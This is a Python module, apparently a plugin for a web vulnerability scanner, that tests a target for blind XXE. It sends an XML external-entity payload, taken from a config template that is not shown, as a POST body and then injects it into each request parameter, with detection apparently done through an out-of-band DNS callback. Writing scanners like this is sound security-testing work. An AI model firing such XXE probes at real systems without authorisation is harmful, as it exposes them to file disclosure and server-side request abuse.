#!/usr/bin/env python
# coding=utf-8


import requests
import base64
import urlparse
from config import *
from lib.common import *


def verify(task):
    """
    this function aim to detect the blind xxe.
    """
    url = task["url"]
    method = task['method']
    headers = task['request_header']
    data = task['request_content'] if method == 'GET' else None

    _ = urlparse.urlparse(url)
    # deal the path
    path = _.path
    if path.split("/")[-1].find(".") > 0: # if contains xx.html
        path = "/".join(path.split("/")[:-1])
    else:
        path = path
    #target = prefix + _.netloc.replace(".", "_") + path.replace("/", "_") + dnslog
    target = base64.b64encode(url).replace('=', '')

    logger.info("[xxe] [target={}]".format(target))

    xxe_xml = XXE_payload.replace('{domain}', target)
    headers = task["request_header"]

    real_header_content_type = headers.get('Content-Type', '')
    headers["Content-Type"] = "application/xml"
    hj = THTTPJOB(url, method='POST', data=xxe_xml, headers=headers)
    for contenttype in ['application/xml', 'text/xml']:
        hj.headers['Content-Type'] = contenttype
        hj.request()

    # if real_header_content_type:
    #     hj.headers['Content-Type'] = real_header_content_type
    # else:
    #     hj.headers.pop('Content-Type')
    hj.method = method
    isjson = False
    xxe_list = [xxe_xml, ]
    if method == 'GET':
        query = hj.url.get_query
    else:
        if is_json_data(hj.data):
            query = urllib.urlencode(json.loads(hj.data))
        else:
            query = hj.data

    xxe_dict = Pollution(query, xxe_list).payload_generate()

    for payload in xxe_dict:
        if method == 'GET':
            hj.url.get_dict_query = payload
        else:
            if isjson:
                hj.data = json.dumps(payload)
            else:
                hj.data = urllib.urlencode(payload)
        hj.request()

    return (False, {})



